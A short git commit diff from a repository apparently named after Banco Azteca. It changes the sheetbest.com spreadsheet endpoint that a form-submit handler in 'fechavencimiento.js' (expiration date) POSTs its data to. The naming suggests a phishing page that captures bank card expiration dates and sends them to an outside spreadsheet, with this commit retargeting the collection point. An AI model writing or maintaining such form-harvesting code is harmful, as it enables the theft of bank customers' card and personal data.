5bbfddd971ea0c69405fbae9c655aabf477e730e
banco-azteca-s18 <robledofrancis4@gmail.com>
2025-09-18 08:14:46 -0600

    Update fechavencimiento.js

--- js/fechavencimiento.js
+++ js/fechavencimiento.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/4a79c40e-ee76-4490-87ff-2042f51ce7af', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/375066bb-a2ef-451b-8777-0bf912f3a9c8', {
         method: 'POST',
         mode: 'cors',
         headers: {
